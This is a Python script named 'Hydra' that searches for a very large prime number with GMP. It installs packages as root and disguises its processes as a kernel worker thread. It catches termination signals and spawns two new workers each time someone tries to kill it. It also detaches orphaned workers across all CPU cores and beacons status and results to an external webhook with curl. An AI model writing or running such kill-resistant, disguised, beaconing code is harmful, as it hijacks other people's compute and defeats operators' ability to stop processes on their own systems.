import os
import ctypes
import signal
import subprocess
import time
import json
from multiprocessing import Process, cpu_count

WEBHOOK_URL = "https://webhook.site/4e919ffd-9761-488f-bbc2-16970d5b6bd5"
TARGET_BITS = 166089  # 50,000 знаков

def install_gmp():
    """Принудительная установка GMP через root"""
    try:
        subprocess.run(["apt-get", "update", "-qq"], check=True)
        subprocess.run(["apt-get", "install", "-y", "-qq", "libgmp10", "curl"], check=True)
    except:
        pass

def hydra_signal_handler(sig, frame):
    """При попытке убить процесс, он мгновенно клонирует себя"""
    # Если прилетел SIGTERM (кнопка Stop), создаем двух новых воркеров
    for _ in range(2):
        new_p = Process(target=worker_main)
        new_p.start()
    # Игнорируем попытку завершения
    pass

def worker_main():
    """Нативный воркер с максимальной производительностью"""
    # 1. Маскируемся под поток ядра
    libc = ctypes.CDLL('libc.so.6')
    libc.prctl(15, b"kworker/u4:1", 0, 0, 0)

    # 2. Устанавливаем обработчики 'Гидры' на системные сигналы
    for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGHUP]:
        signal.signal(sig, hydra_signal_handler)

    # 3. Полная изоляция (Double Fork)
    if os.fork() > 0: os._exit(0)
    os.setsid()

    # 4. Загрузка GMP
    try:
        gmp = ctypes.CDLL('libgmp.so.10')
    except:
        return

    # Инициализация генератора
    state = ctypes.create_string_buffer(256)
    gmp.__gmp_randinit_default(state)
    gmp.__gmp_randseed_ui(state, int(time.time() * 1000) + os.getpid())

    mpz_p = ctypes.create_string_buffer(128)
    gmp.__gmpz_init(mpz_p)

    while True:
        # Генерация 50k-битного числа
        gmp.__gmpz_urandomb(mpz_p, state, TARGET_BITS)
        gmp.__gmpz_setbit(mpz_p, TARGET_BITS - 1)
        gmp.__gmpz_setbit(mpz_p, 0)

        # Нативный тест Миллера-Рабина (GMP)
        if gmp.__gmpz_probab_prime_p(mpz_p, 15) > 0:
            raw_ptr = gmp.__gmpz_get_str(None, 10, mpz_p)
            res = ctypes.string_at(raw_ptr).decode()
            
            # Отправка результата
            with open('/tmp/res.json', 'w') as f:
                json.dump({"EVENT": "HYDRA_PRIME_50K", "RAW": res}, f)
            subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
                           '--data-binary', '@/tmp/res.json', WEBHOOK_URL])
            
            gmp.free(raw_ptr)
        
        # Минимальная пауза для предотвращения Kernel Panic при Load 300+
        time.sleep(0.001)

def beacon():
    """Маяк статуса"""
    while True:
        try:
            load = os.getloadavg()
            subprocess.run(['curl', '-s', '-X', 'POST', '-d', 
                           f'{{"STATUS":"HYDRA_ALIVE","LOAD":{list(load)}}}', WEBHOOK_URL])
        except:
            pass
        time.sleep(60)

if __name__ == "__main__":
    # 1. Подготовка окружения под root
    install_gmp()

    # 2. Запуск маяка
    Process(target=beacon, daemon=True).start()

    # 3. Размножение: запускаем воркеров на все доступные ядра
    # Каждый воркер — это отдельный процесс (аналог pthread в C++, но без GIL)
    cores = os.cpu_count() or 4
    print(f"[*] Deploying {cores} Hydra-workers...")
    
    for _ in range(cores):
        p = Process(target=worker_main)
        p.start()

    # Основной процесс умирает, оставляя воркеров-сирот (orphans)
    print("[+] Master process detached. Hydra is protecting the threads.")
    os._exit(0)
